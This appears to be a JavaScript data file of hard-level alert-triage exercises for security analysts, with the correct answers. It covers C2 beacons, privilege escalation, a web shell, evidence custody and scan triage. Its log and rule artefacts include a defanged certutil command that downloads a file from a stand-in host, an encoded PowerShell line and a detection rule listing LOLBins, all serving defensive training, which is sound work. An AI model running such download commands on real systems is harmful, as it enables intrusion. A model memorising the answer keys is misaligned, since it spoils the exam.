var EXAM = {"keyword": "Alert Triage", "severity": "HARD", "sevClass": "hard", "passScore": 80, "minutes": 52, "intro_blurb": "Challenging level. The alerts are fragments of one intrusion, the evidence disagrees with itself, and the obvious answer is sometimes the wrong one.", "sev_text": "HARD - Challenging. Every exercise hides at least one near-miss answer that is a true statement used in the wrong place. You must read the artefact line by line, apply the rule to the evidence in front of you, and accept that the fast reflex reaction is often the damaging one. Memorised definitions will not carry you through this file."};
var EXERCISES = [{"id": "HARD-01", "type": "triage", "theme": "Attack Patterns & Threat Types", "concepts": ["C2 beaconing", "LOLBins and living off the land", "data exfiltration"], "title": "Four signals, one cluster, two stories", "brief": "Shift A 06:00-14:00 · endpoint and cloud queue · 09:40", "queueName": "SIEM alert queue - shift A 06:00-14:00", "scenario": "<p>Four alerts landed on the same small cluster: two finance workstations, one file server and the finance share. Nothing is confirmed yet, and the queue must be cleared before the 14:00 handover. Two of these alerts are the middle of an attack. Two are normal business that looks exactly like an attack.</p><p>Useful context: the finance team works 08:00-18:00. The nightly archiver runs every night at 02:00. Finance is inside a merger project, so the data on the share is sensitive. The service desk says the two finance users are on site and reachable.</p>", "prompt": "Choose the correct action for every row and submit the queue.", "alerts": [{"id": "INC-77410", "sev": "MEDIUM", "src": "EDR", "title": "Excel spawned certutil on a finance workstation", "detail": "host FIN-WS-22 user a.moreau parent excel.exe image certutil.exe\ncommand line: certutil -urlcache -split -f hxxps://cdn-metrics[.]example/upd.dat\nprocess is signed by Microsoft, task name 'FinanceCleanup' created by helpdesk-admin\ntimeline: the same task ran on this host for 6 days, 02:15 every day", "actions": ["Block the domain cdn-metrics[.]example at the proxy and close the alert with a short note.", "Escalate to the endpoint incident team and validate the scheduled task with the endpoint owner.", "Isolate the workstation now, because a Microsoft-signed tool was abused from a spreadsheet.", "Close the alert as noise: the tool carries a valid signature and the user is on site."], "answer": 1, "outcome": "The endpoint owner confirms in 20 minutes: the service desk wrote that task to repair a broken Excel add-in. A valid change record exists. No isolation, no outage, no false incident. The machine is released from the incident queue with the change number in the ticket."}, {"id": "INC-77412", "sev": "HIGH", "src": "DLP", "title": "1.9 GB uploaded to a personal cloud drive", "detail": "host FIN-WS-11 user d.okafor process browser upload 1,940 MB\ndestination consumer storage domain - not on the approved SaaS list\nwindow 09:12-11:03, after three weeks of 8 MB desktop-agent backups\nline manager: the user mentioned a personal backup, not a company project", "actions": ["Ask the user to explain the upload in a meeting before any other team is told about it.", "Close the alert as approved traffic, because the user is a senior manager in the merger project.", "Block the destination domain, wipe the browser history and warn the user in writing today.", "Escalate to insider threat and legal, and keep the upload records and cloud access logs."], "answer": 3, "outcome": "Insider threat and legal take the case quietly. The upload records, the file list and the cloud access logs are preserved before anybody speaks to the user. Four days later the review shows the user had accepted a job elsewhere. Because nobody warned him, the handover of company data stopped early."}, {"id": "INC-77415", "sev": "LOW", "src": "Cloud", "title": "Nightly file share upload to company cloud storage", "detail": "host FIN-FS-01 process archiver.exe signed vendor agent\ndestination company object storage, approved bucket\nwindow 02:00-02:04 daily, 6.4 GB, same size for 11 months", "actions": ["Treat it as exfiltration and stop the archiver before the next nightly run.", "Close it with a note and request a baseline exception for this approved upload.", "Escalate it to the incident response team because the volume is above 5 GB.", "Ask the finance team to stop the archiver until a full data review is finished."], "answer": 1, "outcome": "The alert is closed in eight minutes with the bucket name, the agent signature and the 11-month baseline in the note. The tuning request removes about 300 identical alerts per month from the queue."}, {"id": "INC-77419", "sev": "HIGH", "src": "Identity", "title": "New local administrator on the backup server", "detail": "host BKP-SRV-02 created account svc_maint2, local Administrators group\nactor vendor maintenance account v.maint, source jump host JUMP-01\nvendor change ticket CHG-88214 covers 02:00-04:00 offline maintenance this week\nno work-order document is attached to CHG-88214", "actions": ["Verify the work order with the vendor and review what the account did before deciding.", "Remove the new account and reset the vendor credentials before the maintenance window ends.", "Escalate to the on-call incident manager at once because a new admin account was created.", "Close the alert, because an approved change window covers the same hours of the night."], "answer": 0, "outcome": "The vendor confirms the account in 30 minutes and sends the work order. The account is removed in the same window with no production impact. The change ticket is updated with the missing document, which is the real finding of the night."}], "explain": "This queue is decided by the surrounding context, not by the alert titles. The Excel task is signed and scheduled, and it has repeated for six days. The helpdesk created it, so it is <b>benign until the change record says otherwise</b>. Isolating the laptop would have been a reflex, not a decision. The personal cloud upload is the opposite trap. A senior manager is inside a merger, the destination is not approved, and the window does not match the normal backup pattern. So it goes to insider threat and legal <b>before</b> anyone speaks to the user. Blocking the domain and warning the user would have destroyed the quiet review. The nightly archiver is a <b>benign true positive</b> - same size for eleven months, signed agent, approved bucket. So it is closed with a note and an exception request. The new admin account is neither clearly good nor clearly bad: a change window exists but the work order does not, so you verify before you act. Closing it on the strength of a ticket number, or ripping out the account during a live maintenance window, are both guesses.", "tip": "For every alert, write down what proves the activity is expected and what proves it is not. If one side is empty, you are not ready to act.", "hint": "Three of the four rows are decided by a document that is missing or present: a change record, a work order, an approved-destination list."}, {"id": "HARD-02", "type": "log", "theme": "Telemetry & Alert Sources", "concepts": ["EDR and XDR endpoint telemetry", "privilege escalation", "LOLBins and living off the land"], "title": "Which line proves privilege escalation?", "brief": "Ticket #SOC-20413 · 07:42 shift A · endpoint telemetry export", "scenario": "<p>The EDR shows that <code>certutil.exe</code> was started while the user <code>a.moreau</code> was logged on to <code>FIN-WS-22</code>. The user is a finance analyst with no administrative rights. The service desk does use signed Microsoft tools for routine maintenance on this host, so the tool name alone proves nothing. You must find the one line that shows a real change of privilege level.</p>", "artifact": {"kind": "log", "title": "Fin-WS-22 - Sysmon event export", "meta": "EDR export · filter: process and token events · 03:24-03:26 UTC · defanged", "lines": [["INFO", "03:24:44 PID 3396 winword.exe parent explorer.exe user a.moreau integrity Medium path C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"], ["INFO", "03:24:58 PID 3396 winword.exe opened document \\\\FIN-FS-01\\finance$\\Q3-forecast-macro-template.docm"], ["INFO", "03:25:08 PID 4412 cmd.exe parent winword.exe user a.moreau integrity Medium command line cmd /c whoami"], ["INFO", "03:25:09 PID 4412 cmd.exe completed with exit code 0, output written to the document folder"], ["INFO", "03:25:10 PID 4412 cmd.exe token changed user a.moreau integrity Medium to High, token type primary"], ["INFO", "03:25:12 PID 5120 certutil.exe parent cmd.exe user a.moreau integrity High command line certutil -urlcache -split -f hxxps://cdn-metrics[.]example/upd.dat"], ["WARN", "03:25:14 PID 5120 certutil.exe wrote upd.dat to C:\\Users\\a.moreau\\AppData\\Local\\Temp and exited with code 0"], ["WARN", "03:25:26 service 'TaskScheduler' event 106: task 'FinanceCleanup' registered by FIN-WS-22\\a.moreau"], ["INFO", "03:25:31 PID 1180 svchost.exe parent services.exe user SYSTEM integrity System map of scheduled task 'FinanceCleanup'"], ["INFO", "03:26:02 scheduled task taskhostw.exe parent svchost.exe user a.moreau integrity High command line powershell -enc SQBFAFgA...cABkAGEAdAA="], ["WARN", "03:26:05 schannel: TLS session to cdn-metrics[.]example from PID 6200, first byte after 60.0 s, certificate CN unused"], ["INFO", "04:02:03 collection: 1,204 events, 11 sources, export complete, no gaps in the window"]]}, "prompt": "Which single line proves privilege escalation rather than normal administrative tooling?", "options": ["03:24:58, where the document is opened from the finance share.", "03:25:10, where the process token changes to High integrity.", "03:25:12, where a Microsoft-signed tool contacts a cloud host.", "03:26:02, where a scheduled task starts a PowerShell process."], "correct": [1], "explain": "Privilege escalation is a change of privilege level, so you look for the line that records it. At 03:25:08 the same process runs at <b>Medium</b> integrity, which is normal for a user without admin rights. At 03:25:10 the token of that process changes to <b>High</b>, and everything that starts after it inherits the higher level. The document opened from the finance share at 03:24:58 is suspicious, because the file came from a share. It does not show any change of rights on its own. A signed tool talking to a cloud host at 03:25:12 is a strong hunting lead, and it is the tool in the wrong hands, not the escalation. The scheduled task at 03:26:02 shows persistence at the <b>same</b> High level, which the escalation line already gave the attacker. One detail matters: this host is a workstation, so creating a task as SYSTEM is not proof of escalation - the token change is.", "tip": "Privilege escalation always shows a token, integrity or account change. Learn to read the integrity level of a process and the process that started it.", "hint": "One line records a change of level. Two lines show a suspicious parent, and one shows persistence at the level already reached."}, {"id": "HARD-03", "type": "log", "theme": "Detection, Enrichment & Threat Context", "concepts": ["detection rule logic and tuning", "log parsing and normalization"], "title": "The rule that exists and never fires", "brief": "Detection review DR-118 · change freeze until Friday · 15:20", "scenario": "<p>Your team confirmed an intrusion that started from a document with a macro. The Sigma rule written for exactly this behaviour has never produced one alert, although the activity is in the SIEM. The rule text, the normalisation details and one matching event are in front of you. The change freeze is on Friday, so the fix must be small and exact.</p>", "artifact": {"kind": "doc", "title": "sigma-rule-0420-and-mapping.txt", "meta": "detection engineering review · draft", "lines": [["## Rule 0420 - signed LOLBin contacted from an Office parent, mapped to ATT&CK T1218"], ["title: Signed LOLBin network use from an Office parent"], ["id: 8f2c-0420", "status: stable", "level: high"], ["logsource:", "  product: windows", "  category: process_creation", "  definition: Sysmon EventID 1"], ["detection:", "  selection:", "    ParentImage|endswith: '\\\\WINWORD.EXE'"], ["    Image|endswith:", "      - '\\\\certutil.exe'", "      - '\\\\mshta.exe'", "      - '\\\\rundll32.exe'"], ["    CommandLine|contains:", "      - 'urlcache'", "      - 'http'", "      - 'downloadstring'"], ["  filter_legit:", "    Image|startswith: 'C:\\\\Program Files\\\\'"], ["  condition: selection and not filter_legit"], ["## Parser and field mapping of the endpoint source in production"], ["Parser endpoint.process_creation maps:", "  event.code to Sysmon event id, computer to host.name"], ["  process.command_line to the full command line, process.executable to the image path"], ["  process.parent.executable to the parent image path, user.name to the account"], ["## One matching event that the rule did not alert on"], ["2025-11-18 03:25:12 FIN-WS-22 event.code 1 process.executable C:\\Windows\\System32\\certutil.exe process.parent.executable C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE process.command_line certutil -urlcache -split -f hxxps://cdn-metrics[.]example/upd.dat user.name a.moreau"], ["## Tuning notes from the review meeting"], ["Note 1: two thousand unrelated process_creation events arrive from the same parser every hour."], ["Note 2: the filter_legit list was added in July after three false positives from an admin script."], ["Note 3: the rule was tested in the lab on Windows 10, where Sysmon uses the same field names as the rule."]]}, "prompt": "Which line explains why the rule never fires on this event?", "options": ["The rule tests the field names ParentImage, Image and CommandLine, which this source does not provide.", "A known false-positive filter for signed Microsoft tools runs after the selection, suppressing the match.", "The command-line conditions are case sensitive, and the real command line mixes upper and lower case.", "The match is exact, so a process image under a versioned Office folder can never satisfy the rule."], "correct": [0], "explain": "Read the parser mapping next to the rule. The endpoint source delivers <code>process.executable</code>, <code>process.parent.executable</code> and <code>process.command_line</code>. The rule tests <code>ParentImage</code>, <code>Image</code> and <code>CommandLine</code>. Those three fields do not exist in the event, so the selection can never be true: the rule is logically correct and operationally dead. Case sensitivity is a good reflex but the wrong answer here. Sigma string matches ignore case, and the real problem is a missing field, not a missing letter. The endswith condition is the one that survives a versioned Office folder, so that option describes the opposite of the rule. The filter option fails on its own logic too. The filter only removes images that start with <code>C:\\Program Files\\</code>, and the tool in the event runs from <code>C:\\Windows\\System32</code>. So the filter cannot suppress this event. The lesson is that a rule can be well written and still be blind.", "tip": "Before you tune a rule, print the rule fields next to the parser mapping. A field that does not exist in the event is not a tuning problem, it is a mapping problem.", "hint": "Compare each field name in the detection block with the field names the parser actually produces."}, {"id": "HARD-04", "type": "branch", "theme": "Attack Patterns & Threat Types", "concepts": ["web shell and server compromise", "blast radius and lateral movement assessment", "evidence preservation and integrity"], "title": "A web shell on the portal server", "brief": "Incident INC-20455 · PWA-01 supplier portal · 10:05", "scenario": "<p>EDR reported a new ASPX file on the internet-facing IIS server <code>PWA-01</code>. The file <code>health_check_.aspx</code> was created on 24 December at 23:58. IIS logs show POST requests to that file from three different external addresses. The application pool runs as the service account <code>svc_portal</code>, which has logged on to <code>DB-02</code>, <code>APP-03</code> and <code>APP-04</code> since 26 December. The portal is used by 900 suppliers and a maintenance window is open on Saturday.</p>", "intro": "A live web shell is on the internet-facing portal server, and the service account that runs it has already logged on to three internal servers. The attacker is probably still active, the portal is in production for 900 suppliers, and both the evidence and the business must survive your decisions.", "prompt": "Work through the decision path. Only one option at each step is defensible.", "nodes": [{"text": "<b>Decision 1.</b> The new ASPX file is still on disk and the site is still running. What do you do now?", "options": [{"t": "Verify the shell: read the file content and its creation time, and review the IIS log entries around it.", "ok": true, "why": "You confirm what the file is and how it is reached before you change the state of a production server. This takes minutes and gives the incident commander facts."}, {"t": "Restart the IIS service at once, so that any attacker session on the server is cut immediately.", "ok": false, "why": "A restart destroys the running processes and the network connections in memory. You lose the proof of how the attacker works while the shell file itself stays on disk."}, {"t": "Take the server out of the load balancer at once, so that no supplier can reach the shell.", "ok": false, "why": "It stops the traffic, but it also destroys volatile evidence and breaks a service used by 900 suppliers before the scope of the compromise is known."}, {"t": "Delete the ASPX file and its folder, then reboot the server to remove any persistence.", "ok": false, "why": "You destroy the sample, the attacker's tooling and the timestamps. The intrusion continues on three other hosts and you can no longer prove how it started."}]}, {"text": "<b>Decision 2.</b> The file is a working web shell, and <code>svc_portal</code> logged on to three more servers. What is the containment move?", "options": [{"t": "Disable the whole supplier portal and tell the suppliers that a maintenance window was moved forward.", "ok": false, "why": "It is a large business action that leaves the credentials untouched on the other three servers, so the attacker simply moves to the next host."}, {"t": "Wait for the incident commander, and keep the current access open so that the attacker's moves stay visible.", "ok": false, "why": "Watching an active shell is a decision for the commander, but leaving a working shell and a valid account in place is not a neutral choice: it allows more damage every minute."}, {"t": "Isolate PWA-01 from the network first, then work out the rest of the scope from the logs.", "ok": false, "why": "Isolating the portal removes one foothold but leaves the same service account valid on three more servers, so the attacker keeps working through the credentials."}, {"t": "Reset the service account password and revoke its sessions before anything else is contained.", "ok": true, "why": "One action invalidates the attacker's access to all four machines at the same time, without taking the supplier portal down. It is the smallest move with the largest effect."}]}, {"text": "<b>Decision 3.</b> Evidence must be kept, and the shell file is the main artefact. How do you handle it?", "options": [{"t": "Photograph the screen of the EDR console with a phone, then remove the shell file from the server.", "ok": false, "why": "A photograph is not evidence of integrity, and removing the file from a running system destroys the memory and the timestamps that go with it."}, {"t": "Wait until the containment is finished, then collect the file and the logs in one batch afterwards.", "ok": false, "why": "The shell may be deleted by the attacker or by a rebuild before you collect it. Evidence is preserved while it still exists, not after the cleanup."}, {"t": "Hash the shell file and the IIS logs, copy both to the evidence store, and record the transfer.", "ok": true, "why": "A hash plus a copy plus a recorded transfer keeps the proof usable later. The live server can then be contained without losing anything."}, {"t": "Copy the shell file to a shared folder on the file server, so that the team can look at it easily.", "ok": false, "why": "A copy in a business share has no hash, no owner and no custody record, so it cannot support a disciplinary or legal process later."}]}, {"text": "<b>Decision 4.</b> The business is asking why the supplier portal slowed down. What do you tell them?", "options": [{"t": "Say that the site is secure but slow today, and keep the intrusion details inside the response team.", "ok": false, "why": "It is not true and it misleads the people who run the service. A stakeholder who finds out later stops trusting the incident channel."}, {"t": "Tell the suppliers directly that the portal was hacked, before the response team has the scope.", "ok": false, "why": "External communication without facts creates panic, invites the attacker to change tools, and may break legal and contract duties."}, {"t": "Brief the service owner and the duty manager with the confirmed facts, the actions taken and the next update time.", "ok": true, "why": "The people who own the service need the confirmed facts and a time for the next update, so that they stop guessing and stop improvising their own answers."}, {"t": "Say nothing, because the incident is not confirmed and any message would be premature.", "ok": false, "why": "Silence leaves the business without a plan and the response team without support. Confirmed facts and a next-update time cost nothing and prevent rumour."}]}, {"text": "<b>Decision 5.</b> Which items must be in the handover note for the next shift?", "options": [{"t": "The recommendation to rebuild the server, with the name of the engineer who will do the rebuild.", "ok": false, "why": "A rebuild decision belongs to the incident commander, and this note omits the timeline, the scope and the evidence that justify any recovery step."}, {"t": "The full timeline, the affected hosts, the preserved evidence reference, and the open questions.", "ok": true, "why": "The next analyst needs the timeline, the scope, the proof that evidence exists and what is still unknown. That is what allows the case to continue without re-reading every log."}, {"t": "The alert titles, the name of the analyst on shift and the time the incident was opened.", "ok": false, "why": "This is a list of events without meaning. The next shift cannot continue the case and will repeat the first two hours of work."}, {"t": "The attacker's three external addresses, so the next shift can block them at the gateway.", "ok": false, "why": "Indicators alone are weak and easy for the attacker to change. Blocking three addresses does not cover the compromised credentials or the four hosts."}]}], "explain": "The chain punishes reflex actions. Verifying the shell first costs minutes and gives facts; restarting or deleting destroys the volatile evidence you need. The containment turn is the hard one. The service account is the thing that reaches four machines, so <b>the credential is the containment point</b>. It is not the single server and not the whole portal. Evidence handling is about integrity. A hash, a copy and a custody record make the artefact usable. A share copy or a phone photo makes it worthless in a later process. The communication step is not about hiding or confessing: it is about telling the service owner confirmed facts and a next-update time. The handover must carry the timeline, the scope, the evidence reference and the open questions. Those four items are what the next analyst needs to continue the case.", "tip": "Write down, for each decision, whether it removes the attacker's access or only removes the alarm. Containment follows the credential, not the host.", "hint": "One account reaches four machines, and one action can invalidate it everywhere at once without stopping the public service."}, {"id": "HARD-05", "type": "classify", "theme": "Response & Containment", "concepts": ["blocking at firewall, proxy and DNS sinkhole", "host isolation and containment", "evidence preservation and integrity"], "title": "Ten actions, four response phases", "brief": "Incident INC-20501 · response plan review · 16:30", "scenario": "<p>The response plan for a confirmed C2 beacon lists actions as a flat list. The incident commander wants every action placed in the phase where it belongs, because the team keeps arguing about order under pressure. The four phases are Detect/Verify, Contain, Eradicate and Recover.</p>", "prompt": "Drag each action into the phase where it belongs.", "buckets": ["Detect/Verify", "Contain", "Eradicate", "Recover"], "items": [{"text": "Capture the memory image of the beaconing workstation.", "bucket": "Detect/Verify"}, {"text": "Check the beacon interval and the TLS certificate against known malware.", "bucket": "Detect/Verify"}, {"text": "Sinkhole the C2 domain so that the beacon has nowhere to go.", "bucket": "Contain"}, {"text": "Isolate the affected subnet from the rest of the corporate network.", "bucket": "Contain"}, {"text": "Remove the loader binary and its scheduled task from the host.", "bucket": "Eradicate"}, {"text": "Reset the password of the account used by the loader.", "bucket": "Eradicate"}, {"text": "Restore the affected file server from a clean backup.", "bucket": "Recover"}, {"text": "Verify the rebuilt hosts with a full scan before production use.", "bucket": "Recover"}, {"text": "Return the quarantined mailboxes to the mail service for users.", "bucket": "Recover"}, {"text": "Reimage the two compromised laptops from the clean image.", "bucket": "Recover"}], "explain": "The phase decides the order, and the near-misses sit on the borders. Memory capture and certificate checks are <b>verification</b>: you do them while the system is still live, so that you know what you are dealing with. Sinkholing the domain and isolating the subnet <b>stop the spread</b> without repairing anything. Removing the loader and resetting the abused password are <b>eradication</b>: the threat is taken out of the environment. Restoring, reimaging, returning mailboxes and scanning the rebuilt hosts are all <b>recovery</b>, because the work returns the service to production. Two traps are common. Reimaging looks like cleaning, but a rebuilt host is a recovery step because it puts a working machine back. Resetting a password looks like recovery, but its purpose is to remove the attacker's access, which is eradication.", "tip": "Ask one question per action: does it find out, does it stop, does it remove, or does it restore? The verb decides the phase.", "hint": "Two actions belong to the verifying stage and eight are shared between the other three, so count which phase has the most work."}, {"id": "HARD-06", "type": "match", "theme": "Prioritization, Risk & Metrics", "concepts": ["order of volatility for evidence", "evidence preservation and integrity", "chain of custody"], "title": "Match each evidence item to its handling", "brief": "Case IR-2025-118 · evidence plan before containment · 11:15", "scenario": "<p>Containment is approved for a compromised server and will start in 30 minutes. The evidence list is already agreed, but each item must be collected in the right way. Some items disappear the moment you pull the network cable.</p>", "prompt": "Match each evidence item with the way it must be handled.", "pairs": [{"left": "CPU registers and processor cache of the live server", "right": "Collect only with an approved live memory tool - nothing survives a power cycle"}, {"left": "Contents of RAM on the compromised server", "right": "Capture with a forensic memory tool before the host is isolated or rebooted"}, {"left": "Current network connections and listening ports", "right": "Record from the live system before you pull the network cable"}, {"left": "Running processes and their loaded modules", "right": "List live with the EDR console and export the result with a hash"}, {"left": "Firewall session logs held on the remote collector", "right": "Preserve with a read-only export and a retention hold on the collector"}], "explain": "The order of volatility runs from the fastest to disappear to the slowest. Processor registers and cache go in seconds. Memory goes when the host loses power or is rebooted. Live network connections vanish as soon as you isolate the machine. Process lists change continuously. A disk image keeps its content, but it needs a hash at acquisition, so that you can prove later that nothing changed. The remote firewall logs are the near-miss pair. They are <b>network</b> evidence, but they live on a central collector, so there is no seizure and no disk image of the firewall. The correct handling is a read-only export plus a retention hold. Notice that three of the five items are collected live. That is exactly why containment waits 30 minutes for an agreed evidence plan instead of running at once.", "tip": "Learn the volatility order: registers and cache, memory, network state and processes, disk, then logs on remote collectors. Collect the fastest first.", "hint": "Three items exist only while the machine is switched on and connected. One item survives on disk. One item lives on another system."}, {"id": "HARD-07", "type": "terminal", "theme": "Response & Containment", "concepts": ["SOAR playbooks and automation", "blocking at firewall, proxy and DNS sinkhole", "evidence preservation and integrity"], "title": "Run the containment playbook without losing the proof", "brief": "Incident INC-20455 · playbook PB-C2-CONTAIN v4 · approved by the on-call manager", "scenario": "<p>The on-call manager approved limited containment for <code>FIN-WS-22</code>. The shelter tool is called <code>soarctl</code> and it can run playbooks, isolate endpoints through the EDR, block domains at the gateway and pull evidence. One rule of the playbook matters: the memory image must be exported <b>before</b> the host is isolated, because isolation closes the channels the collector uses.</p>", "prompt": "Type the commands in the terminal. The goal of the current step is written under the terminal window.", "console": "soarctl - soc-sh-01", "consoleMode": "shelter console · case INC-20455 open", "steps": [{"goal": "Start the containment playbook PB-C2-CONTAIN for case INC-20455.", "accept": ["^soarctl\\s+playbook\\s+run\\s+pb-c2-contain\\s+--case\\s+inc-20455$", "^soarctl\\s+playbook\\s+run\\s+--case\\s+inc-20455\\s+pb-c2-contain$"], "out": "playbook PB-C2-CONTAIN v4 | case INC-20455 | 5 steps queued | automation paused at every action that needs approval", "example": "soarctl playbook run PB-C2-CONTAIN --case INC-20455", "err": "That command does not start a named playbook for this case."}, {"goal": "Export the memory image of FIN-WS-22 into ./evidence and record its hash.", "accept": ["^soarctl\\s+evidence\\s+export\\s+--type\\s+memory\\s+--host\\s+fin-ws-22\\s+--dest\\s+\\./evidence\\s+--hash$", "^soarctl\\s+evidence\\s+export\\s+--type\\s+memory\\s+--host\\s+fin-ws-22\\s+--hash\\s+--dest\\s+\\./evidence$", "^soarctl\\s+evidence\\s+export\\s+--host\\s+fin-ws-22\\s+--type\\s+memory\\s+--dest\\s+\\./evidence\\s+--hash$"], "out": "memory image ./evidence/FIN-WS-22-memory.raw written (16 GB) | sha256 9f2c41ab...e07d | custody entry created", "example": "soarctl evidence export --type memory --host FIN-WS-22 --dest ./evidence --hash", "err": "That command does not export a memory image for this host with a hash."}, {"goal": "Isolate FIN-WS-22 through the EDR without rebooting it.", "accept": ["^soarctl\\s+edr\\s+isolate\\s+--host\\s+fin-ws-22\\s+--no-reboot$", "^soarctl\\s+edr\\s+isolate\\s+--no-reboot\\s+--host\\s+fin-ws-22$"], "out": "FIN-WS-22 isolated | network blocked except the EDR control channel | host not rebooted | analyst a.okafor recorded as the actor", "example": "soarctl edr isolate --host FIN-WS-22 --no-reboot", "err": "That command does not isolate this host, or it would reboot it and destroy the memory in use."}, {"goal": "Block the C2 domain cdn-metrics[.]example at the gateway for all sites.", "accept": ["^soarctl\\s+block\\s+--type\\s+domain\\s+--value\\s+cdn-metrics\\[\\.\\]example$", "^soarctl\\s+block\\s+--value\\s+cdn-metrics\\[\\.\\]example\\s+--type\\s+domain$"], "out": "block created | type domain | value cdn-metrics[.]example | scope all sites | expires never | gateway policy pushed to 14 sites", "example": "soarctl block --type domain --value cdn-metrics[.]example", "err": "That command does not create a domain block for the reported C2 value."}, {"goal": "Open the case record and link the evidence that was exported.", "accept": ["^soarctl\\s+case\\s+open\\s+--id\\s+inc-20455\\s+--link\\s+\\./evidence$", "^soarctl\\s+case\\s+open\\s+--link\\s+\\./evidence\\s+--id\\s+inc-20455$"], "out": "case INC-20455 updated | severity SEV2 | 2 hosts linked | evidence folder linked with hash list | next update due in 2 hours", "example": "soarctl case open --id INC-20455 --link ./evidence", "err": "That command does not open the case record with the evidence linked to it."}], "explain": "A shelter tool makes the easy actions fast, so the analyst must know the <b>order</b> and the <b>scope</b> of each action. The playbook is started by name and for one case, otherwise automation runs on the wrong target. The memory export comes before the isolation. Isolation closes the collection channel, so the live memory would be lost. The hash in the output is what makes the image usable as evidence. The isolation carries a flag that keeps the host powered on, since a reboot would destroy the memory you just captured and the running processes. The block is created for a domain and for all sites, because a block on one site only moves the beacon to the next office. The case is opened last and the evidence folder is linked, so the custody entry and the case record point at the same files.", "tip": "Before you press a playbook button, know its order: export the volatile evidence first, then isolate, then block, then record the case.", "hint": "The memory export must be finished before the isolation step, and the isolation must not reboot the host."}, {"id": "HARD-08", "type": "multi", "theme": "Attack Patterns & Threat Types", "concepts": ["port scanning and reconnaissance", "IDS and IPS alerts", "blast radius and lateral movement assessment"], "title": "Which scans are hostile?", "brief": "Ticket #SOC-20461 · IDS bundle from one source · 13:10", "scenario": "<p>The IDS sent six scan alerts from three different sources in one afternoon. The vulnerability team runs an approved scan every Tuesday and the build server runs an inventory script at deploy time. You must select the activity that is truly hostile and must be contained. One of these sources sits behind a NAT address, so the apparent source of an alert is not always the real one.</p>", "prompt": "Select every alert that is truly malicious and must be contained.", "options": ["An address sweep of TCP 445 and 3389 on the office VLAN from the NATed jump host, on a Sunday.", "A 1,200-host vulnerability scan from ten-scan-01 with valid credentials and a matching approved request.", "A sweep of TCP 22 from the build server during the standard deploy window, matching the deploy job.", "An ICMP sweep of the lab VLAN from the lab router during a documented network test.", "A /24 sweep of the server VLAN from build-srv-07, off the deploy schedule, with no signed inventory job.", "A 4,000-port sweep of the DMZ from an external address, on a hosting provider with a poor reputation."], "correct": [0, 4, 5], "explain": "Three signals make a scan hostile. It does not match an approved schedule or owner. It targets services that lead to lateral movement. It comes from a source you do not trust. The sweep from <code>build-srv-07</code> happens off the deploy schedule and no job claims it, so the build server has been used as a platform. That is real reconnaissance from inside, and it also means the host itself may be compromised. The external sweep of the DMZ comes from a hosting provider with a poor reputation and looks for open services. That is classic reconnaissance before an attempt. The sweep of TCP 445 and 3389 from the NATed jump host is the subtle one. Those ports carry file sharing and remote desktop, which are exactly the paths an attacker uses to move. A Sunday run with no change record does not match the maintenance calendar. The approved vulnerability scan, the deploy-window inventory sweep and the documented lab test all have an owner. They also have a schedule in the request system and a matching source, so they are <b>expected activity</b>: they are noisy, not hostile.", "tip": "Judge a scan by its owner, its schedule and its target ports, not by the number of packets. An approved scan with a request number is noise with a purpose.", "hint": "Three alerts have a matching owner and schedule. Three do not, and one of the three hides behind a NAT address."}, {"id": "HARD-09", "type": "fill", "theme": "Response & Containment", "concepts": ["chain of custody", "evidence preservation and integrity"], "title": "Write the custody record for a seized laptop", "brief": "Case IR-2025-121 · HR investigation with legal hold · 18:40", "scenario": "<p>A laptop and a memory image were taken during an HR investigation. Legal will read your custody record before any interview, so every word must be exact.</p><p>Case IR-2025-121 is open under a legal hold, and the lawyer wants the record before the 22:00 shift handover. The evidence safe in room B-114 closes at 20:00.</p>", "artifact": {"kind": "doc", "title": "IR-2025-121-evidence-log.txt", "meta": "case record · draft for legal review", "lines": [["## Evidence 1: laptop LT-4471, seized from the desk of d.okafor at 18:20"], ["## Evidence 2: memory image FIN-WS-11-memory.raw, 16 GB, taken live at 18:26"], ["Both items are held in the evidence safe in room B-114."]]}, "prompt": "Complete the custody record with the correct words.", "text": "The analyst records every transfer of the laptop in the custody log: who held it, when, and why. At seizure the disk image is hashed, and the same hash is checked again before any analysis, so that [[0]] can be proved. The laptop is then stored in a sealed bag with a numbered tamper seal and the seal number is written in the log, so that the bag is [[1]]. The memory capture follows the two-person rule: one analyst runs the tool and the other witness signs the log, because [[2]] protects both the case and the analysts. A copy of the image is later compared with the original hash, and any difference is reported as a possible [[3]]. The case is handed to the next shift with the evidence list, the seal numbers and the hash values in the ticket note, because a handover without the [[4]] list would leave the evidence unprotected.", "blanks": ["integrity", "sealed", "two-person control", "tamper", "custody"], "bank": ["custody", "sealed", "tamper", "verdict", "quarantine", "integrity", "two-person control", "SLA", "ticket"], "explain": "A custody record exists to prove three things: who touched the evidence, and when, and that nothing changed while it was held. <b>Integrity</b> is the property the hash proves: the image today is the image that was taken at seizure. <b>Sealed</b> describes the state of the bag, and the numbered tamper seal is what makes the seal meaningful. The <b>two-person control</b> rule covers the memory capture, where a second person watches and signs, which protects the case and the analysts from any later question. <b>Tamper</b> is the word for a change to the evidence after collection; a mismatched hash is reported as possible tampering, never quietly corrected. The <b>custody</b> list is what the next shift must receive, together with the seal numbers and the hashes. Quarantine, verdict, SLA and ticket are real words from the SOC. They belong to response and service work, not to the proof of what happened to a piece of evidence.", "tip": "Learn the four words that protect evidence: custody, hash and integrity, seal and tamper, and two-person control.", "hint": "One blank is the property a hash proves. One describes the bag. One is the rule for the memory capture. One is a possible change, and one is the list that goes to the next shift."}, {"id": "HARD-10", "type": "rank", "theme": "Prioritization, Risk & Metrics", "concepts": ["blast radius and lateral movement assessment", "asset criticality and CMDB context", "risk scoring and prioritization models"], "title": "Rank five alerts by blast radius", "brief": "Ticket #SOC-20477 · 22:05 · shift B needs one clear order", "scenario": "<p>Five alerts are open at the same time with one analyst on shift. The rule agreed with the L2 lead is: rank by the number of systems the attacker could reach from this alert, using the CMDB extract. Break a tie with asset criticality, not with the alert severity.</p>", "artifact": {"kind": "table", "title": "cmdb-extract-alert-scope.csv", "meta": "CMDB export · trust relationships and criticality", "head": ["Asset", "Criticality", "Trust relationships in CMDB", "Alert"], "rows": [["DC-01 domain controller", "Critical 1", "Authenticates 4,200 accounts and 310 servers", "Kerberoasting service tickets for 12 accounts"], ["BKP-SRV-01 backup server", "Critical 1", "Holds restore copies for 210 servers and 40 TB of data", "New administrator account created from a laptop"], ["WEB-05 internet web server", "High 2", "Reaches 1 database host through a fixed account", "Uploaded web shell file in the images folder"], ["VPN-GW-01 VPN gateway", 